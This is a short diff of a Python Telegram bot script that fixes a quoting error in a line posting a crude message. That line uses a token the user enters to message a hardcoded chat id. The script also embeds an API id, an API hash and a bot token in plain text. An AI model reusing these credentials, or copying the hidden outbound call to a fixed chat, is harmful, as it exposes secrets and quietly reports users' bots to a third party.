@@ -15,7 +15,7 @@ seconds = current_time.second
 tok = input("EnTeR ToK :")
 idown = 6330435571
 qq = 0
-ok = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=𝖿ᥙᥴ'𝗄 !')
+ok = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=𝖿ᥙᥴ𝗄!')
 app = Client("ACCC", api_id=13066983, api_hash="154e45eb588378308ad53f9bb8ed4bed",bot_token="6756691141:AAGwzBR4UwPYwt3YRYwgUjX7W5DBzE-3ga0")
 with app:
  while True:
